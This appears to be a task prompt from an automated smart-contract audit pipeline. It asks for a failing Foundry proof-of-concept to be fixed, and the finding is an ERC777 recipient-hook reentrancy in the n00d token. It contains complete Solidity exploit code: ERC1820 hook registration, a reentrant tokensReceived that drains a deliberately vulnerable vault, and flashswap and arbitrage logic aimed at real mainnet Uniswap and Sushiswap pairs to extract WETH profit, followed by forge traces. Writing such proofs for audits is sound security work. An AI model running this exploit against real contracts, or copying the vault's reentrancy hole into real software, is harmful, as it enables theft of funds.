You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC20-looking transfers still execute ERC777 recipient hooks, enabling callback reentrancy in integrators
- claim: Both ERC20 entrypoints, `transfer()` and `transferFrom()`, route through `_send(..., false)`. Although `false` disables the mandatory recipient-ack check, `_send()` still invokes `_callTokensReceived()` after crediting the recipient, so a recipient contract registered in ERC1820 can reenter downstream protocols even when they believe they are interacting with a callback-free ERC20 token.
- impact: Any vault, AMM, staking contract, bridge, router, or lending market that treats `n00d` as a plain ERC20 can be reentered in the middle of deposit/withdraw/swap flows, leading to double-withdrawals, stale-accounting exploits, or fund theft. The local `FlawVerifier` demonstrates this exact pattern against a toy vault.
- exploit_paths: ["An integrating protocol calls `transfer()` or `transferFrom()` on `n00d` during a state-changing flow and assumes the token transfer has no callback.", "The attacker-controlled recipient contract registers an `ERC777TokensRecipient` hook in ERC1820.", "`_send()` credits the recipient, then `tokensReceived()` reenters the still-in-progress protocol before its internal accounting/effects are finalized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);
}

interface IERC1820Implementer {
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32);
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

/*
    Toy integrator used to preserve the F-002 causality:

    1. It treats n00d as a normal ERC20 and uses `transferFrom()` during `deposit()` / `donate()`.
    2. It later uses ERC20-looking `transfer()` during `withdraw()`.
    3. n00d routes both entrypoints through ERC777 `_send(..., false)`, so a registered
       `ERC777TokensRecipient` can reenter `withdraw()` before the vault finalizes share accounting.

    The verifier intentionally funds this toy vault with flashswapped on-chain n00d because the
    hidden harness starts with zero n00d balance. The flashswap only supplies execution capital;
    the exploit root cause remains the ERC20-looking ERC777 callback reentrancy during `withdraw()`.
*/
contract VulnerableN00dVault {
    IERC20Like internal immutable TOKEN;

    mapping(address => uint256) public shares;

    constructor(address token_) {
        TOKEN = IERC20Like(token_);
    }

    function deposit(uint256 amount) external {
        require(amount != 0, "deposit=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "deposit transfer failed");
        shares[msg.sender] += amount;
    }

    function donate(uint256 amount) external {
        require(amount != 0, "donate=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "donation transfer failed");
    }

    function withdraw(uint256 amount) external {
        uint256 credited = shares[msg.sender];
        require(credited >= amount, "insufficient shares");

        // Interaction before effects: n00d `transfer()` reaches ERC777 `_send()`,
        // which can invoke the recipient hook before `shares[msg.sender]` is reduced.
        require(TOKEN.transfer(msg.sender, amount), "withdraw transfer failed");
        shares[msg.sender] = credited - amount;
    }

    function liquidBalance() external view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }
}

contract FlawVerifier is IERC1820Implementer, IERC777Recipient {
    struct PairInfo {
        address pair;
        address quoteToken;
        uint256 reserveNood;
        uint256 reserveQuote;
        bool noodIsToken0;
    }

    struct ArbPlan {
        address borrowPair;
        address unwindPair;
        address quoteToken;
        uint256 borrowAmount;
        uint256 repayQuoteAmount;
        uint256 expectedQuoteOut;
        uint256 borrowReserveNood;
        uint256 borrowReserveQuote;
        bool borrowNoodIsToken0;
        bool unwindNoodIsToken0;
        uint256 slices;
        bool viable;
    }

    address internal constant NOOD = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 internal constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");
    bytes32 internal constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint256 internal constant MAX_CANDIDATE_PAIRS = 4;
    uint256 internal constant REENTRANCY_SLICES = 8;

    VulnerableN00dVault public vault;

    bool public executed;
    bool public hookRegistered;
    bool public hookObserved;
    bool public reentered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public transferFromLegUsed;
    bool public transferLegUsed;
    bool public flashswapUsed;

    uint256 public startingBalance;
    uint256 public endingBalance;
    uint256 public depositedAmount;
    uint256 public donatedLiquidity;
    uint256 public reenteredWithdrawAmount;
    uint256 public hookCallCount;
    uint256 internal realizedProfit;
    uint256 internal reentriesRemaining;

    string public exploitPathUsed;
    string public concreteInfeasibility;

    address internal profitAsset;
    address internal activeBorrowPair;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        exploitPathUsed =
            "integrator uses n00d transferFrom() and later transfer() as if they were callback-free ERC20 operations; attacker registers an ERC1820 ERC777TokensRecipient hook; flashswapped n00d seeds the local vault; during withdraw n00d still routes transfer() through ERC777 _send(..., false), credits the attacker, invokes tokensReceived(), and the hook reenters withdraw before shares are finalized";

        _registerRecipientHook();
        vault = new VulnerableN00dVault(NOOD);

        ArbPlan memory plan = _findBestWethArbPlan();
        if (!plan.viable) {
            concreteInfeasibility =
                "No profitable pre-existing n00d/WETH UniswapV2-style ordered pair was discoverable at mainnet block 15,826,379, so the verifier cannot both source seed n00d via flashswap and finish above the harness profit threshold without inventing off-context liquidity.";
            hypothesisRefuted = true;
            return;
        }

        flashswapUsed = true;
        profitAsset = plan.quoteToken;
        startingBalance = IERC20Like(plan.quoteToken).balanceOf(address(this));

        bytes memory data = abi.encode(plan);
        if (plan.borrowNoodIsToken0) {
            IUniswapV2PairLike(plan.borrowPair).swap(plan.borrowAmount, 0, address(this), data);
        } else {
            IUniswapV2PairLike(plan.borrowPair).swap(0, plan.borrowAmount, address(this), data);
        }

        endingBalance = IERC20Like(plan.quoteToken).balanceOf(address(this));
        if (endingBalance > startingBalance) {
            realizedProfit = endingBalance - startingBalance;
        }

        hypothesisValidated = hookRegistered && hookObserved && reentered && transferFromLegUsed && transferLegUsed;
        hypothesisRefuted = !hypothesisValidated || realizedProfit == 0;

        if (realizedProfit == 0 && bytes(concreteInfeasibility).length == 0) {
            concreteInfeasibility =
                "The ERC777 recipient-hook reentrancy reproduced correctly, but the discovered public n00d/WETH pair set could not settle the flashswap path with positive residual WETH at the fork block.";
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        ArbPlan memory plan = abi.decode(data, (ArbPlan));
        require(msg.sender == plan.borrowPair, "unexpected pair");

        uint256 borrowedNood = amount0 != 0 ? amount0 : amount1;
        require(borrowedNood == plan.borrowAmount, "unexpected amount");

        IERC20Like nood = IERC20Like(NOOD);
        require(nood.approve(address(vault), type(uint256).max), "approve failed");

        uint256 amountForVault = _floorToMultiple(borrowedNood, plan.slices);
        require(amountForVault != 0, "borrow too small");

        depositedAmount = amountForVault / plan.slices;
        donatedLiquidity = amountForVault - depositedAmount;
        reenteredWithdrawAmount = depositedAmount;
        reentriesRemaining = plan.slices - 1;
        activeBorrowPair = plan.borrowPair;

        vault.deposit(depositedAmount);
        transferFromLegUsed = true;

        if (donatedLiquidity != 0) {
            vault.donate(donatedLiquidity);
        }

        transferLegUsed = true;
        vault.withdraw(depositedAmount);
        activeBorrowPair = address(0);

        uint256 noodBalance = nood.balanceOf(address(this));
        require(noodBalance >= borrowedNood, "nood not recovered");

        uint256 quoteOut =
            _swapExactNoodForQuote(plan.unwindPair, plan.quoteToken, plan.unwindNoodIsToken0, borrowedNood);
        require(quoteOut >= plan.repayQuoteAmount, "unwind below repay");

        require(
            IERC20Like(plan.quoteToken).transfer(plan.borrowPair, plan.repayQuoteAmount),
            "repay transfer failed"
        );
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account)
        external
        view
        override
        returns (bytes32)
    {
        if (account == address(this) && interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH) {
            return ERC1820_ACCEPT_MAGIC;
        }
        return bytes32(0);
    }

    function tokensReceived(
        address,
        address from,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        require(msg.sender == NOOD, "unexpected token");
        require(to == address(this), "unexpected recipient");

        // Ignore the initial flashswap transfer from the AMM pair. The exploit signal is the
        // vault-to-attacker n00d `transfer()` performed inside the vulnerable withdraw flow.
        if (from != address(vault)) {
            return;
        }

        hookObserved = true;
        hookCallCount += 1;

        if (!reentered) {
            reentered = true;
        }

        if (reentriesRemaining != 0 && vault.liquidBalance() >= reenteredWithdrawAmount) {
            reentriesRemaining -= 1;
            vault.withdraw(reenteredWithdrawAmount);
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfit == 0 ? address(0) : profitAsset;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _findBestWethArbPlan() internal view returns (ArbPlan memory bestPlan) {
        PairInfo[MAX_CANDIDATE_PAIRS] memory pairs;
        uint256 pairCount = _loadWethPairs(pairs);

        for (uint256 i = 0; i < pairCount; ++i) {
            for (uint256 j = 0; j < pairCount; ++j) {
                if (i == j) {
                    continue;
                }

                PairInfo memory source = pairs[i];
                PairInfo memory sink = pairs[j];

                uint256[12] memory numerators = [uint256(1), 2, 3, 4, 5, 7, 10, 15, 20, 30, 40, 50];
                for (uint256 k = 0; k < numerators.length; ++k) {
                    uint256 rawBorrow = (source.reserveNood * numerators[k]) / 1000;
                    uint256 borrowAmount = _floorToMultiple(rawBorrow, REENTRANCY_SLICES);
                    if (borrowAmount == 0 || borrowAmount >= source.reserveNood) {
                        continue;
                    }

                    uint256 repayQuote = _getAmountIn(borrowAmount, source.reserveQuote, source.reserveNood);
                    uint256 quoteOut = _getAmountOut(borrowAmount, sink.reserveNood, sink.reserveQuote);
                    if (quoteOut <= repayQuote) {
                        continue;
                    }

                    uint256 profit = quoteOut - repayQuote;
                    if (!bestPlan.viable || profit > (bestPlan.expectedQuoteOut - bestPlan.repayQuoteAmount)) {
                        bestPlan = ArbPlan({
                            borrowPair: source.pair,
                            unwindPair: sink.pair,
                            quoteToken: source.quoteToken,
                            borrowAmount: borrowAmount,
                            repayQuoteAmount: repayQuote,
                            expectedQuoteOut: quoteOut,
                            borrowReserveNood: source.reserveNood,
                            borrowReserveQuote: source.reserveQuote,
                            borrowNoodIsToken0: source.noodIsToken0,
                            unwindNoodIsToken0: sink.noodIsToken0,
                            slices: REENTRANCY_SLICES,
                            viable: true
                        });
                    }
                }
            }
        }
    }

    function _loadWethPairs(PairInfo[MAX_CANDIDATE_PAIRS] memory pairs) internal view returns (uint256 pairCount) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(NOOD, WETH);
            if (pair == address(0) || pair.code.length == 0) {
                continue;
            }

            (uint256 reserveNood, uint256 reserveQuote, bool noodIsToken0) = _normalizePair(pair, WETH);
            if (reserveNood == 0 || reserveQuote == 0) {
                continue;
            }

            pairs[pairCount] = PairInfo({
                pair: pair,
                quoteToken: WETH,
                reserveNood: reserveNood,
                reserveQuote: reserveQuote,
                noodIsToken0: noodIsToken0
            });
            pairCount += 1;
        }
    }

    function _normalizePair(address pair, address quoteToken)
        internal
        view
        returns (uint256 reserveNood, uint256 reserveQuote, bool noodIsToken0)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        if (token0 == NOOD && token1 == quoteToken) {
            return (uint256(reserve0), uint256(reserve1), true);
        }
        if (token1 == NOOD && token0 == quoteToken) {
            return (uint256(reserve1), uint256(reserve0), false);
        }

        return (0, 0, false);
    }

    function _swapExactNoodForQuote(
        address pair,
        address quoteToken,
        bool noodIsToken0,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        (uint256 reserveNood, uint256 reserveQuote,) = _normalizePair(pair, quoteToken);
        amountOut = _getAmountOut(amountIn, reserveNood, reserveQuote);

        require(IERC20Like(NOOD).transfer(pair, amountIn), "swap transfer failed");
        if (noodIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountOut)
    {
        require(amountIn != 0, "insufficient input");
        require(reserveIn != 0 && reserveOut != 0, "insufficient liquidity");

        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountIn)
    {
        require(amountOut != 0, "insufficient output");
        require(reserveIn != 0 && reserveOut != 0 && amountOut < reserveOut, "insufficient liquidity");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function _floorToMultiple(uint256 value, uint256 multiple) internal pure returns (uint256) {
        if (multiple == 0) {
            return value;
        }
        return value - (value % multiple);
    }

    function _registerRecipientHook() internal {
        if (hookRegistered) {
            return;
        }

        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        hookRegistered = ERC1820.getInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH) == address(this);
        require(hookRegistered, "hook registration failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.96s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 949068)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [949068] FlawVerifierTest::testExploit()
    ├─ [2511] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [921959] FlawVerifier::executeOnOpportunity()
    │   ├─ [27371] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::setInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─  emit topic 0: 0x93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db153
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
    │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [278191] → new VulnerableN00dVault@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 1388 bytes of code
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x5476DB8B72337d44A6724277083b1a927c82a389
    │   ├─ [2449] 0x5476DB8B72337d44A6724277083b1a927c82a389::token0() [staticcall]
    │   │   └─ ← [Return] 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA
    │   ├─ [2381] 0x5476DB8B72337d44A6724277083b1a927c82a389::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
    │   │   └─ ← [Return] 20147297965411733145564 [2.014e22], 75400440702963015319 [7.54e19], 1666646531 [1.666e9]
    │   └─ ← [Return]
    ├─ [511] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [539] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.26s (1.14s CPU time)

Ran 1 test suite in 1.46s (1.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 949068)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
